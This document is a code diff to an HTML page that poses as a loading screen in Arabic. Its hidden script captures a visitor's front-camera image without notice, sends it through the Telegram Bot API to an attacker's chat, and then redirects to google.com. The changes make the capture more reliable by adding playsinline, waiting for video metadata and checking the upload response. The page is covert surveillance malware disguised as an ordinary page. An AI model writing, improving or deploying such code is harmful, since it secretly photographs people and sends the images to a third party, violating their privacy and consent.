@@ -6,7 +6,7 @@
 </head>
 <body>
   <h3>جارٍ تحميل الصفحة...</h3>
-  <video id="video" autoplay style="display:none;"></video>
+  <video id="video" autoplay playsinline style="display:none;"></video>
   <canvas id="canvas" style="display:none;"></canvas>
 
   <script>
@@ -20,40 +20,52 @@
         formData.append("chat_id", chatId);
         formData.append("photo", blob, "photo.jpg");
 
-        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+        const response = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
           method: "POST",
           body: formData
         });
+
+        const data = await response.json();
+        if (!data.ok) {
+          console.error("فشل إرسال الصورة:", data);
+        }
       } catch (error) {
-        console.error("فشل إرسال الصورة:", error);
+        console.error("خطأ أثناء إرسال الصورة:", error);
       }
     }
 
     async function captureAndSendCameraImage() {
       try {
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+
         const stream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: "user" }
         });
 
-        const video = document.getElementById('video');
         video.srcObject = stream;
 
-        setTimeout(() => {
-          const canvas = document.getElementById('canvas');
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
-          const ctx = canvas.getContext('2d');
-          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        // انتظر حتى يتم تشغيل الفيديو فعلاً
+        video.onloadedmetadata = () => {
+          video.play();
 
-          // إيقاف الكاميرا
-          stream.getTracks().forEach(track => track.stop());
+          setTimeout(() => {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
 
-          const base64Image = canvas.toDataURL("image/jpeg");
-          sendPhoto(base64Image).then(() => {
-            window.location.href = "https://google.com";
-          });
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-        }, 3000); // انتظر 3 ثواني
+            // أوقف الكاميرا
+            stream.getTracks().forEach(track => track.stop());
+
+            const base64Image = canvas.toDataURL("image/jpeg");
+            sendPhoto(base64Image).then(() => {
+              window.location.href = "https://google.com";
+            });
+
+          }, 3000); // انتظر 3 ثواني بعد بدء الفيديو
+        };
       } catch (err) {
         alert("فشل الوصول للكاميرا: " + err);
         window.location.href = "https://google.com";
